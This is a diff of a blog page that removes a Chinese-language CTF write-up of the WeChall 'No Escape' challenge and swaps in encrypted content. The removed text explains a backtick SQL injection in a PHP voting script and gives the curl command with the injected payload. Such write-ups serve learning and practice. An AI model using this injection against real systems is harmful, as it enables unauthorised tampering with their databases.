@@ -22,20 +22,21 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Challenge 在线投票系统，需要将任意候选人的票数设为 111。票数达到 100 会自动重置。有源代码。 Solution 源码中 noesc_voteup() 的关键漏洞： 12$who &#x3D; GDO::escape($who);$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;; $who 被直接插入到">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - No Escape">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-no-escape/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Challenge 在线投票系统，需要将任意候选人的票数设为 111。票数达到 100 会自动重置。有源代码。 Solution 源码中 noesc_voteup() 的关键漏洞： 12$who &#x3D; GDO::escape($who);$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;; $who 被直接插入到">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-04T02:49:23.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.381Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.171Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="exploit">
 <meta property="article:tag" content="mysql">
 <meta property="article:tag" content="php">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="wechall">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -208,7 +209,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -221,7 +222,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -242,12 +242,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -320,7 +320,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -362,26 +362,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
-<p>在线投票系统，需要将任意候选人的票数设为 111。票数达到 100
-会自动重置。有源代码。</p>
-<h3 id="solution">Solution</h3>
-<p>源码中 <code>noesc_voteup()</code> 的关键漏洞：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$who</span> = GDO::<span class="title function_ invoke__">escape</span>(<span class="variable">$who</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE noescvotes SET `<span class="subst">$who</span>`=`<span class="subst">$who</span>`+1 WHERE id=1&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p><code>$who</code> 被直接插入到 SQL
-的列名位置（反引号内）。<code>GDO::escape()</code>
-只转义字符串值（引号等），但<strong>不转义反引号</strong>。</p>
-<p>防御代码仅检查了 <code>$who</code> 以 'id' 开头或含
-'/'，但未过滤反引号：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="title function_ invoke__">stripos</span>(<span class="variable">$who</span>, <span class="string">&#x27;id&#x27;</span>) === <span class="number">0</span>) || (<span class="title function_ invoke__">strpos</span>(<span class="variable">$who</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span>) ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Please do not mess with the id.&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>利用反引号注入闭合列名，用 <code>--</code> 注释掉后面的 SQL：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b &#x27;WC=...&#x27; -g \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/no_escape/index.php?vote_for=scholz%60%3D111%20--%20&#x27;</span><br></pre></td></tr></table></figure>
-<p>URL 解码后 <code>vote_for=scholz</code>=111 -- `，执行的实际
-SQL：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> noescvotes <span class="keyword">SET</span> `scholz`<span class="operator">=</span><span class="number">111</span> <span class="comment">-- `=`scholz`=111 -- `+1 WHERE id=1</span></span><br></pre></td></tr></table></figure>
-<p><code>SET</code> 子句被截断为
-<code>SET</code>scholz<code>=111</code>，scholz 的票数直接设为 111。</p>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="b592276a6505005f197be99ce69c03554bcbdb476a8310ab42417552a8bf7824"
+     data-nonce="4bedd26986dc51ac9f839d50"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    dd4d380edfda518cf72586ea9d28edd7f984417c3723272f922c1e89c4892f8381740917c0263ac13bb335b992a38fa59c9f045fd3d7d1e6e82879aac57c80027999c32dc75d0f6cea9dd7167ea7a5a11f6692a83a912205f5d20c82cde77f9ccff123ee7f45810d9ad41aac2d2997b980f7dc70c759c8ce425f3058b3aa1e20453d09657d9c78e76b3973ef5c2bacbc9e4d90d97770e019a62e4b50f6f31e3a0267a36d4e67da2d8a7a51906f281d4ba6cbccae65bbfc1ddb669459975554272a4a44903d1e52340c24784b32ac8cc145144dd9b8c98c89f0898e6d69fa1a5547ba29f0f5e2dc807b303505b1afc02f6fc21c37f970d9d8fc0f91b34b70370d9cd328d30bbd444bd7ba7b441524fbf9f3183172e9e194f2ad05290617aea87e080348e05f5474ee7c31beb7f4c10aa4d6bb539d36a9a5556367a5ceaf0f290e1cda08fb7467aae9eb15ee88d63c61a07acd0061bafb67f625cb2c842b5cb1e0f4e3b5d21e8124a1496bb54cb2b469badde1922b02596dee2697d0adb86685f845b6a2abd1343d635361f010724ea0f242ac0ac105c5bc615e8709080f1635c2d47d571d5cba82ccb1316a9aab5632e51d1035ad18548326bcf3d7e757d8fc87d3bb595b052203ad3dafe8eb994545899e7dd02cb6ca3b9086557b50382f7ee939d7a03435fdcb7daac005eddc767ba6045866e993ce9329c6e6ab21e95d4e43c66899820e7a5db3b8cb70df611cc6b2ab1742a94cc96c48599c9e366677c8db317e5f4380b3ed066bb0a237244daa180e0e10dc6b044f34174adf4dc4818d724d1a9db8e70634508ba38fd4fa0cd12096e5694a67c746f4e423c39f9a4b4db24959e4f3b3069803b7227fbde96b899ac8c96814b4e6bc7be51ac6b799ab1e615c1d429701ee09b09d0f7cfb2b68a2c2335e5ebf5709f3fc568afe1691d8f42696f9f2eda5de073996438eb5b28806d8657d589486191987bef8b38ad6a129b18351535a863445e9c4d2b884626f5054ae9ae73f7e247055dfa68d939f32490e426e17c29ef9393aa0955756afd7ae0ff4f3faf35b78e129e3d875c94637083410075517a52e52f36d6a5c397078dc2b11425865d79c86d2f9fa24ac129d7f62f7e1d7b6450e94c8f75608fd9af2bc0b4315403e88ab90ba3744e1c8f7398e29d5845b0d9c215708fd0ca9d877794cb0789b4ae8c7c22e2be743031dc83b48ab4a7417fc47db87fb7f9d0748b6452a79b961a5f621f9f029011b51add3cba5ea64dfdd6a4e4f9f1deb2cec8fc80137de122826f64b49b34edf194b9c0db4446ad1aa80799f89efe817dea35bb635f2a03c679382b2670de2ff1a974bb9858910e5326fbee17e431593d44a2edbd610c8eb788f454323a1e38cc8623b2780c0f17c92954618831f7fd0b96d65df16ee38a34c39e255893250f636c494d8506a7e9ee54d3f980dde0a097e93ebd9912ddb00a1fb73452e98f7a859b6085bdd04af92ca80a443b169b099c3c82d19f87aeb8e9379158028c9e12572191c8a18d24d2a1915dfa91f7ae3b9a3e5470e81605228be690905d0c071cc53d77f1ea9474abd20a24cb23d14f2b3a38792f45860a5c3ca46f76b414482402a5ef86efa4817e266809f9e48c3294924722713999af9b56102d59a526f29fa29c7aff9cc11cd9bc800c476c3fcb96efd75ba0e5e5e3644786bfecbd83219f83b89b338acf7cbcb76c2ff36a83ed25f22a87af3011d49c8d0a140cb8aada7d754de2e3b941a4498fca4186ca5279550ff1c45de2caf3400085ec7022849d6ce9b1a7ce548a91a1967edcfefef87924ec9d910173f90a5520bdd7e95a6c7ecc1443a614378b1ed0049d5edf1433201a48026ec38b4e83077c2f1b3e5cedd0d04fbdb7fdeac79de1a5522b5a1c3afecbc8ab5aa1eb0498a67f5aecb03ee7c0215f84bd04d2f0d0334ba9b669502dc29b6a005bc7d3b55cb7c8e9e2f84d73e2dcd378fdffb0625e79d4f89eecaa2203dfbf91976ac2ae4afb2ffbbc2a31f6d93e003955896a0ff30c0586bdb88b4e5cee5e5074f2fcf7cd28301658451c8ee4c3c3007620a8a1b53b8fcca28d83d30d66bf8bff51bb902cc44900a0e726a4a411a3d6d5ebffcba48bbf137afa38f1aa1f5408feb4b079133ea94b29c7ad55fc3c5d9969c5cf5426234bf11f30d172dd3005b7b5be1e4f2aef093df4de10af4fbd0d0893e6685f880489a7507628e8d675ad18b2957ca7f9293c8ec131ab8db8d377ef9e6e98722a4f0c296cbff0a6e0e188532d1a01bfc1e13d0c22410ddedad7809590e849b7a22894f907401ffe7a289108c45078b0cb73dc0399c4e87063ba897209473141670e494b10e4682452c9c7b68912217e606851e205da2183b6f1506e034464f84e70ec169de01b67a7d82a85b3c64fabd0821d38688593aaea09e7279c550cecab4ae73eadb0649ba6d8cc30c23dbf0be87180e81e16ffc54f4104aa87e75a3620dd61587b7867fa0e6b4b514b6d07b5ae76889701565bbb4c8eb7d0c5de82f21022c5ec1b6ab3e6d3a11a7f26f26f2acb325d81221a12cb9231b268cc867a9c18436f4c2a950d85f6f070ecd0722712a44b95507ee8cc2ea52888444535fbc74eeb11a7f4bbc17e53dc0bb947322d36fc6773d22af33cb656caa210db92c85334c67273751496c25fc1d50f95e5554ad2631affc9aacd328dd804a5aa85a70c2ef207fe321bb0bc8a0f4b28a10005094bbab81e2a19d7720cf382f9b444cd69f51492b7ad113173af053b7555f4473c8af1718324b13fc5eaca369c448696cbe7d80672e9b5c76c449647bd244f8e7c2e3529e48f4f38e891573b7b1c8a247444679fec8ac84fc35af888e019c85919daa4e53959dd2d190488c567a118847aa537553e20ac32b9634c615aa98722480643d73727744e8a32dfcea150ef2dfa213eaf32dde2ab6a186491e6ed07c59b055f0759a2affa6f11f40a256e92023fcd98ca9c50bed1c0ccb6c4f8aaea6dfc997685148a55f4deeab4e452d4cdd74fa7634867f267ed3eb55f9bcac7cebfcda66cd124b729ec25de4ff5d46d8282f01ed7a426e5595dd768e24ecbeb5544b19e67e0d4e754b3f161b562a1c705204a4a6ad6225c7e3b4d6fcdd0b02b3b6855fedf43d0d51deb5ac3c112e7022350e355879200e62dd772941b8475878e8cd82a9269c3177f66ff3a12896bb798fae67ee1902a08110844a56e4989ac1ecb4186d659eb0fe4ac388173be7f763e16bfd1c84c8318d337ffa8022cf55156b7f8d08094d1e3438b8193090b0cf63cb3a701b93299d9e51e826137d047a754698d5b5dacf800c4a87243f026c457e6f6b3f485331245a02f21949364e79640a9ac86b87aef7a85edbf337915e00ba2c57158e7359cc270dd1839f4e6e738b69cca97565ffc1ab2f7a1edc41b909ad37df941b788dfe54edadd487a9e576b1182b7b6dc27e5e3409efb46e98b7acf340e6579da6b29f3a78bc67e0c05a36c8f1dd2517290a06a557bb7fb36f246af48c440607e2fa42609a4eed41d47c21ed55d80e9fe492b6a94b19a62c508b7dbda30bafed6064a3c8c0fa61cef6caee537ac26af6ced31aacc2182eea11767f49f9454e1da4d3dbb32170deaa24844c92e202f5cfbc230071af70ae7e29a376a1004bef1a2f5fefafc0454442df332531d8e67afe56e3cb8c499ba8cafb5492246e3c1e8d6a1307ed3506f1a23836ac9dd8ca77c0862526c35666d74bc6df2753ef2dd2e07c66c88fb76f78873dd2b387593210dba60b5251165d339442fd2fdd58954d692f027f19c797fed0a5f40875bb61ac3c6840be27f239c5a97f27c7d8d275ea01f4bf5ce635bf68ea2aa7f81cdef29c8ae7020d2b7db3b4ca626358d682de1ba2cfc368824d46a91f90864e385a6ba4afa51b2b1c0c3bae85d164e47aa7fd6df7423bc84bc6b3d9834a05240a8cadfd37589d824abece9f001f4e862b263d5fb8d3dcd058dc8e695e963c5a0e44d1c1120ced78d9701f1e3d1b8a99eb5918282015740dd568fde73f45151a59d49ad478d73327dd2cca2117362479431763be848f5a6147761024ef1bfe99b7b147a32658a357a1b90364c9c98fd07499782c1af61db2d5eb39c9d6e69ceec51b7518eada2ec0da05782b9e9b4401adb2915a8ace938a03fffc979310f397b6e3f7cb8622df8f3fceef8d76b9690e2efc17aeb881fe2349291af87ad467faf527cc35a5b794d8178d801b7045a13eba238e6155af24ac4694e81a98f2ce7c6879d42787bf5dccb6606269865021798328b1d0b5f4ed274a5fd645c6bfd9c8bd26bcfdec5440caec6a2b51415943daf335ab42eed9f20e28467fdf1645dbd4797a07cc1a204cc422362d63f99735d42d1712bbc73f256602147cb7c0701d944b6856cbe46498ed1fb1b7adb84a16a70cf94b4d3a2410cc543b903eee4ffd2b2e686d65
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -426,9 +431,10 @@ SQL：</p>
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
               <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
-              <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
               <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
           </div>
 
